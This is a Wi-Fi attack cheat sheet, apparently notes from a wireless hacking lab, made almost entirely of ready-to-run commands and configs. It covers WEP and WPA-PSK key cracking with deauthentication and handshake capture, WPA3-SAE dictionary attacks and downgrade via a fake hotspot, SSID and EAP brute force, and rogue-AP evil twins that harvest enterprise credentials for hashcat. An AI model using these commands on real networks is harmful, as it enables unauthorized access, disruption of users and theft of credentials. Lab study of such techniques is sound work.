# List of Wi-Fi interfaces
> Checking Wi-Fi devices `iw dev`
- wlan0 - zwykle do monitoringu
- wlan1 - do hotspotów
- wlan2 - do łączenia

# Enable monitoring mode
- airmon-ng start wlan0 
- airmon-ng stop wlan0 
- iw dev wlan0mon info

# change MAC address
``` bash copy
ip link set wlan2 down
macchanger -m 28:6C:07:6F:F9:67 wlan2
ip link set wlan2 up
```

# List of Wi-Fi networks and saving them to a .cap file
- airodump-ng wlan0mon --band abg --wps -c 11 -w wifilist

# password cracking
- aircrack-ng wifilist-01.cap -w rockyou-top100000.txt

# 2 GHZ
| Kanał | Częstotliwość (MHz) | Pasmo        |
| ----- | ------------------: | ------------ |
| 1     |                2412 | 2.4 GHz      |
| 2     |                2417 | 2.4 GHz      |
| 3     |                2422 | 2.4 GHz      |
| 4     |                2427 | 2.4 GHz      |
| 5     |                2432 | 2.4 GHz      |
| 6     |                2437 | 2.4 GHz      |
| 7     |                2442 | 2.4 GHz      |
| 8     |                2447 | 2.4 GHz      |
| 9     |                2452 | 2.4 GHz      |
| 10    |                2457 | 2.4 GHz      |
| 11    |                2462 | 2.4 GHz      |
| 12    |                2467 | 2.4 GHz      |
| 13    |                2472 | 2.4 GHz      |
| 14    |                2484 | 2.4 GHz (JP) |

# 5 GHZ
| Kanał | Częstotliwość (MHz) |
| ----- | ------------------: |
| 36    |                5180 |
| 40    |                5200 |
| 44    |                5220 |
| 48    |                5240 |
| 52    |                5260 |
| 56    |                5280 |
| 60    |                5300 |
| 64    |                5320 |
| 100   |                5500 |
| 104   |                5520 |
| 108   |                5540 |
| 112   |                5560 |
| 116   |                5580 |
| 120   |                5600 |
| 124   |                5620 |
| 128   |                5640 |
| 132   |                5660 |
| 136   |                5680 |
| 140   |                5700 |
| 144   |                5720 |
| 149   |                5745 |
| 153   |                5765 |
| 157   |                5785 |
| 161   |                5805 |
| 165   |                5825 |

# OPN

## brute-force attack on the SSID
- mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt

## Connecting to the OPN network
- nano opn.conf
``` conf copy
network={
	ssid="wifi-free"
	key_mgmt=NONE
	scan_ssid=1
}
```
1. wpa_supplicant -i wlan2 -c opn.conf
2. dhclient -v wlan2

# WEP

## WEP key cracking
- airodump-ng wlan0mon --band abg -c 3 -w wep

1. sudo aireplay-ng -1 0 -a F0:9F:C2:71:22:11 -c 3E:C8:44:0A:24:BA wlan0mon
2. sudo aireplay-ng -3 -b F0:9F:C2:71:22:11 -h 3E:C8:44:0A:24:BA wlan0mon
3. aircrack-ng wep.cap

## Connecting to the WEP network
- nano wep.conf
``` conf copy
network={
  ssid="wifi-old"
  key_mgmt=NONE
  wep_key0=11BB33CD55
  wep_tx_keyidx=0
}
```
1. wpa_supplicant -i wlan2 -c wep.conf
2. dhclient wlan2 -v

# WPA-PSK

## Cracking a WPA-PSK key
1. airodump-ng wlan0mon --band abg -c 6 --wps -w psk
2. aireplay-ng -0 1 -a F0:9F:C2:71:22:12 wlan0mon
3. aircrack-ng psk-01.cap -w rockyou-top100000.txt

## decrypting WPA-PSK packets
1. airdecap-ng -e wifi-mobile -p starwars1 ~/psk.cap
2. wireshark ~/psk-dec.cap

## Connecting to the WPA network
- nano psk.conf
``` conf copy
network={
    ssid="wifi-mobile"
    psk="starwars1"
    key_mgmt=WPA-PSK
    proto=WPA2
}
```
1. wpa_supplicant -i wlan2 -c psk.conf
2. dhclient wlan2 -v

## Checking the isolation of WiFi network users
1. arp-scan -I wlan2 -l
2. curl 192.168.2.7

## fake hotspot
- nano hostapd.conf
``` conf copy
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=wifi-offices
mana_wpaout=hostapd.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```
1. hostapd-mana hostapd.conf
- hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force
- hashcat -m 22000 hostapd.hccapx ~/rockyou-top100000.txt --force

# WPA3-SAE

## WPA3-SAE key cracking
[https://github.com/blunderbuss-wctf/wacker](https://github.com/blunderbuss-wctf/wacker)

1. cd ~/tools/wacker
2. ./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462

## Connecting to the WPA3-SAE network
- nano sae.conf
``` conf copy
network={
    ssid="wifi-management"
    key_mgmt=SAE
    ieee80211w=2
    sae_password="chocolate1"
}
```
1. wpa_supplicant -i wlan2 -c sae.conf
2. dhclient wlan2 -v

## Backward compatibility: WPA3-SAE and WPA2-PSK

### backward compatibility testing
1. airodump-ng wlan0mon -c 11 -w saepsk
2. cat saepsk01.csv 

### fake hotspot
- nano hostapd-sae.conf
``` conf
interface=wlan1
driver=nl80211
hw_mode=g
channel=11
ssid=wifi-IT
mana_wpaout=hostapd-management.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```
1. hostapd-mana hostapd-sae.conf
2. aireplay-ng wlan0mon -0 1 -a F0:9F:C2:1A:CA:25  -c 10:F9:6F:AC:53:52
- hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force
- hashcat -m 22000 hostapd.hccapx ~/rockyou-top100000.txt --force

### Connecting to the WPA3-SAE network as WPA2-PSK
- nano saepsk.conf
``` conf copy
network={
    ssid="wifi-IT"
    psk="bubblegum"
    key_mgmt=WPA-PSK
    proto=WPA2
}
```
1. wpa_supplicant -i wlan2 -c saepsk.conf
2. dhclient wlan2 -v

# EAP

## wifi_db
1. python3 wifi_db.py ~/wifireg-01.cap -d db.SQLITE 
2. sqlitebrowser db.SQLITE 

## Wireshark filters
- for identity `eap.code == 2`
- for certificate `tls.handshake.certificate`
- for a more precise cert `(wlan.sa == F0:9F:C2:7A:33:28) && (tls.handshake.certificate)`

## tool for automatically extracting certificates, IDs, etc.
- ./pcapFilter.sh  -f ~/wifireg-01.cap -C`

## tool for checking support for EAP authentication methods 
- ./EAP_buster.sh "wifi-global" "GLOBAL\GlobalAdmin" "wlan1"

## EAP password BF
- python2 ./air-hammer.py -i wlan3 -e wifi-corp -p ~/rockyou-top100000.txt -u test.user

## EAP user BF
1. cat ~/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > ~/top-usernames-shortlist-contoso.txt
2. python2 ./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u ~/top-usernames-shortlist-contoso.txt

## Connecting to the EAP network
- nano EAP.conf
``` conf copy
network={
    ssid="wifi-corp"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="CONTOSO\juan.tr"
    password="bulldogs1234"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
```
1. wpa_supplicant -i wlan2 -c EAP.conf
2. dhclient wlan2 -v

## Cracking a EAP network with tool
1. ./eaphammer --cert-wizard
2. ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced

3. > at the same time in two terminals:

-  1. iwconfig wlan0mon channel 44
-  2. aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:07:6C:40

-  1. iwconfig wlan0mon channel 44
-  2. aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan0mon -c 64:32:A8:07:6C:40

4. cat logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' >> hashcat.5500
5. hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force

## Cracking a EAP network, manual method

### installation of the necessary tools
- sudo apt install freeradius freeradius-utils hostapd-mana aircrack-ng hashcat

### setting the interface to monitoring mode
- airodump-ng wlan0mon --band abg --wps -w wifieap -c 44

### get handshake
- sudo aireplay-ng -0 1 -a F0:9F:C2:71:22:1A -c 64:32:A8:07:6C:40 wlan0mon

#### extract identity
1. open wifieap.cap in wireshark
2. filer `eap.code == 2`
3. open `Response, Identity`
4. `Extensible Authentication Protocol`
3. extract Identity

#### extract certificate
1. open wifieap.cap in wireshark
2. filer `tls.handshake.certificate`
3. open `Server Hello, Certificate`
4. Extensible Authentication Protocol
5. Tansport Laer Security
6. TLSv1.2 Record Layer: Handshake Protocol: Certificate
7. Handshake Protocol: Certificate
8. Certificates (xxxx bytes)
9. extract certificate by `ctrl+shift+x`
10. save as cert.der
11. openssl x509 -inform der -in cert.der -text

### create fake network
1. cd /etc/freeradius/3.0/certs
2. nano ca.cnf
3. nano server.cnf
4. rm dh
5. make

### prepare mana hotspot config
- nano mana.eap_user
``` conf copy
*	PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

- nano network.conf
``` conf copy
ssid=wifi-corp
interface=wlan1
driver=nl80211
channel=44
hw_mode=a
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0
eap_user_file=mana.eap_user
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh
auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
mana_wpe=1
mana_credout=hostapd.credoutfile
mana_eapsuccess=1
mana_eaptls=1
```

### create mana hotspot
1. hostapd-mana network.conf
2. > at the same time in two terminals:
-  1. iwconfig wlan0mon channel 44
-  2. aireplay-ng -0 1 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:BA:6C:41
-  1. iwconfig wlan0mon channel 44
-  2. aireplay-ng -0 1 -a F0:9F:C2:71:22:15 wlan0mon -c 64:32:A8:BA:6C:41
3. hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force